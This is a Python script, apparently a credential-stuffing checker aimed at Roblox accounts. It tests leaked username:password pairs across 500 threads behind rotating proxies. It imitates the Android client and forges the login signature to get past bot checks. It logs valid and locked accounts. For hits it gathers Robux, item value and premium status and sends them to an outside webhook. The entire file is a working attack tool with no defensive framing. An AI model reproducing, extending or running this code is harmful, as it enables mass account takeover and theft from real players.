from primp import Client
import secrets
from time import time, sleep
from base64 import b64encode
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import ec
from threading import Thread, Lock
from colorama import Fore, init
import json
import random
import logging
from datetime import datetime

init(autoreset=True)
logging.getLogger().setLevel(logging.CRITICAL)

class cursed:
    PROXY = "" # rotating pliz
    THREADS = 500
    SESSION_RESET = 10

    WEBHOOK = ""

    USER_AGENTS_ANDROID = [
        "",
        "",
        "",
        "",
    ]

    def __init__(self):
        self.lock = Lock()
        self.combo_index = 0

        self.valid_count = 0
        self.invalid_count = 0
        self.locked_count = 0
        self.checked_count = 0

        self.start_time = time()

        self.checked_invalid = self.load_lines("invalid.txt")
        self.checked_valid = self.load_lines("valid.txt")
        self.checked_locked = self.load_lines("locked.txt")
        self.checked_multi = self.load_lines("multi.txt")

        with open("combo.txt", "r", encoding="utf-8") as f:
            combos = [x.strip() for x in f if ":" in x]

        random.shuffle(combos)

        self.combos = [
            c for c in combos
            if c not in self.checked_invalid
            and c not in self.checked_valid
            and c not in self.checked_locked
            and c not in self.checked_multi
        ]

        del self.checked_invalid
        del self.checked_valid
        del self.checked_locked
        del self.checked_multi

        with open("combo.txt", "w", encoding="utf-8") as f:
            for c in self.combos:
                f.write(c + "\n")

        self.total_combos = len(self.combos)

        self.invalid_file = open("invalid.txt", "a", buffering=1)
        self.valid_file = open("valid.txt", "a", buffering=1)
        self.locked_file = open("locked.txt", "a", buffering=1)
        self.multi_file = open("multi.txt", "a", buffering=1)

    def censor_email(self, email):
        if "@" not in email:
            return email
        name, domain = email.split("@", 1)
        if len(name) <= 2:
            name = name[0] + "*"
        else:
            name = name[0] + "*"*(len(name)-2) + name[-1]
        return f"{name}@{domain}"

    def generate_traceparent(self):
        return f"00-{secrets.token_hex(16)}-{secrets.token_hex(8)}-01"

    def load_lines(self, file):
        try:
            with open(file, "r", encoding="utf-8") as f:
                return set(x.strip().split(" | ")[0] for x in f if x.strip())
        except:
            return set()

    def get_cpm(self):
        elapsed = time() - self.start_time
        if elapsed <= 0:
            return 0
        return int((self.checked_count / elapsed) * 60)

    def build_footer(self):
        return {
            "text": f"H: {self.valid_count} | L: {self.locked_count} | IN: {self.invalid_count} | C: {self.checked_count}/{self.total_combos} | CPM: {self.get_cpm()}"
        }

    def reset_session(self):
        session = Client(
            impersonate="chrome_145",
            impersonate_os="android",
            proxy=self.PROXY,
            verify=True,
            timeout=30
        )

        base_headers = {
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.roblox.com",
            "referer": "https://www.roblox.com/",
            "sec-ch-ua": f'"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": random.choice(self.USER_AGENTS_ANDROID),
            "x-requested-with": "com.roblox.client",
        }

        session.headers.update(base_headers)

        sleep(random.uniform(0.1, 0.5))
        try:
            session.get("https://www.roblox.com/", timeout=10)
        except:
            pass

        private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
        public_key = private_key.public_key()

        spki_bytes = public_key.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        client_public_key = b64encode(spki_bytes).decode()

        return session, private_key, client_public_key

    def send_webhook(self, embed):
        try:
            session = Client(proxy=self.PROXY, verify=False)
            session.post(self.WEBHOOK, json={"embeds": [embed]})
        except:
            pass

    def get_account_info(self, session, user_id):
        robux = 0
        rap = 0
        join = "Unknown"
        limited_count = 0
        premium = False
        avatar = None

        try:
            sleep(random.uniform(0.05, 0.15))
            r = session.get(f"https://users.roblox.com/v1/users/{user_id}")
            if r.status_code == 200:
                raw_join = r.json().get("created")
                if raw_join:
                    dt = datetime.fromisoformat(raw_join.replace("Z", "+00:00"))
                    join = dt.strftime("%B %d, %Y")
        except:
            pass

        try:
            sleep(random.uniform(0.05, 0.15))
            r = session.get("https://economy.roblox.com/v1/user/currency")
            if r.status_code == 200:
                robux = r.json().get("robux", 0)
        except:
            pass

        try:
            sleep(random.uniform(0.05, 0.15))
            r = session.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100")
            if r.status_code == 200:
                items = r.json().get("data", [])
                limited_count = len(items)
                for item in items:
                    rap += item.get("recentAveragePrice", 0)
        except:
            pass

        try:
            sleep(random.uniform(0.05, 0.15))
            r = session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
            if r.status_code == 200:
                premium = r.json()
        except:
            pass

        try:
            sleep(random.uniform(0.05, 0.15))
            r = session.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=false")
            if r.status_code == 200:
                avatar = r.json()["data"][0]["imageUrl"]
        except:
            pass

        return robux, rap, join, limited_count, premium, avatar

    def worker(self):
        session, private_key, client_public_key = self.reset_session()
        session_start = time()
        request_count = 0

        while True:
            if time() - session_start > self.SESSION_RESET or request_count > 20:
                session, private_key, client_public_key = self.reset_session()
                session_start = time()
                request_count = 0

            with self.lock:
                if self.combo_index >= len(self.combos):
                    return
                combo = self.combos[self.combo_index]
                self.combo_index += 1

            user, password = combo.split(":", 1)
            ctype = "Email" if "@" in user else "Username"

            sleep(random.uniform(0.05, 0.2))

            try:
                r = session.get("https://apis.roblox.com/hba-service/v1/getServerNonce", timeout=10)
                server_nonce = r.text.strip('"')

                client_epoch_timestamp = int(time())

                payload_sig = f"{client_public_key}|{client_epoch_timestamp}|{server_nonce}".encode()
                signature = private_key.sign(payload_sig, ec.ECDSA(hashes.SHA256()))
                sai_signature = b64encode(signature).decode()

                payload = {
                    "ctype": ctype,
                    "cvalue": user,
                    "password": password,
                    "secureAuthenticationIntent": {
                        "clientPublicKey": client_public_key,
                        "clientEpochTimestamp": client_epoch_timestamp,
                        "serverNonce": server_nonce,
                        "saiSignature": sai_signature
                    }
                }

                headers = {
                    "traceparent": self.generate_traceparent(),
                    "x-requested-with": "com.roblox.client"
                }

                r = session.post("https://auth.roblox.com/v2/login", headers=headers, json=payload, timeout=10)
                request_count += 1

                csrf = r.headers.get("x-csrf-token")

                if csrf:
                    headers["x-csrf-token"] = csrf
                    sleep(random.uniform(0.1, 0.3))
                    r = session.post("https://auth.roblox.com/v2/login", headers=headers, json=payload, timeout=10)
                    request_count += 1

                text = r.text
                email_display = self.censor_email(user)

                if "Incorrect username or password." in text:
                    print(Fore.RED + f"invalid | {email_display}")
                    with self.lock:
                        self.invalid_file.write(combo + "\n")
                        self.invalid_count += 1
                        self.checked_count += 1

                elif "Account has been locked" in text:
                    with self.lock:
                        self.locked_file.write(combo + "\n")
                        self.locked_count += 1
                        self.checked_count += 1

                elif "Challenge is required" in text:
                    print(Fore.YELLOW + f"captcha | {email_display}")

                elif ctype == "Email" and "Received credentials belong to multiple accounts" in text:
                    print(Fore.MAGENTA + f"multi | {email_display}")
                    self.checked_count += 1

                    try:
                        data = r.json()
                        field_data = json.loads(data["errors"][0]["fieldData"])
                        users = field_data.get("users", [])

                        with self.lock:
                            self.multi_file.write(combo + "\n")

                        for acc in users:
                            name = acc.get("name")
                            uid = acc.get("id")

                            if not name:
                                continue

                            with self.lock:
                                self.multi_file.write(f"{name}:{password}\n")

                            avatar = None
                            rap = 0
                            join = "Unknown"

                            for _ in range(5):
                                try:
                                    if uid and join == "Unknown":
                                        sleep(random.uniform(0.1, 0.3))
                                        ur = session.get(f"https://users.roblox.com/v1/users/{uid}")
                                        if ur.status_code == 200:
                                            raw_join = ur.json().get("created")
                                            if raw_join:
                                                dt = datetime.fromisoformat(raw_join.replace("Z", "+00:00"))
                                                join = dt.strftime("%B %d, %Y")
                                except:
                                    pass

                                try:
                                    if uid and rap == 0:
                                        sleep(random.uniform(0.1, 0.3))
                                        ir = session.get(f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100")
                                        if ir.status_code == 200:
                                            for item in ir.json().get("data", []):
                                                rap += item.get("recentAveragePrice", 0)
                                except:
                                    pass

                                try:
                                    if uid and not avatar:
                                        sleep(random.uniform(0.1, 0.3))
                                        tr = session.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=420x420")
                                        if tr.status_code == 200:
                                            avatar = tr.json()["data"][0]["imageUrl"]
                                except:
                                    pass

                                if avatar and join != "Unknown":
                                    break

                            embed = {
                                "title": "New Multi",
                                "color": 16753920,
                                "fields": [
                                    {"name": "Email", "value": email_display, "inline": False},
                                    {"name": "Username", "value": f"@{name}", "inline": True},
                                    {"name": "RAP", "value": f"{rap:,}", "inline": True},
                                    {"name": "Join Date", "value": join, "inline": False}
                                ],
                                "footer": self.build_footer()
                            }

                            if avatar:
                                embed["thumbnail"] = {"url": avatar}

                            self.send_webhook(embed)

                    except:
                        pass

                elif '"user":' in text:
                    print(Fore.GREEN + f"valid | {email_display}")

                    with self.lock:
                        data = json.loads(text)
                        username = data["user"]["name"]
                        user_id = data["user"]["id"]

                        self.valid_file.write(f"{combo} | @{username}\n")
                        self.valid_count += 1
                        self.checked_count += 1

                    robux, rap, join, limited_count, premium, avatar = self.get_account_info(session, user_id)

                    embed = {
                        "title": "New Account",
                        "color": 16777215,
                        "fields": [
                            {"name": "Username", "value": f"@{username}", "inline": True},
                            {"name": "Robux", "value": str(robux), "inline": True},
                            {"name": "RAP", "value": str(rap), "inline": True},
                            {"name": "Limiteds", "value": str(limited_count), "inline": True},
                            {"name": "Premium", "value": str(premium), "inline": True},
                            {"name": "Join Date", "value": join, "inline": False}
                        ],
                        "footer": self.build_footer()
                    }

                    if avatar:
                        embed["thumbnail"] = {"url": avatar}

                    self.send_webhook(embed)

            except Exception as e:
                error_msg = str(e).lower()
                if any(x in error_msg for x in ['timeout', 'proxy', 'connection', 'timed out', 'unreachable']):
                    print(Fore.RED + "Proxy Error")
                pass

    def start(self):
        threads = []

        for _ in range(self.THREADS):
            t = Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

if __name__ == "__main__":
    cursed().start()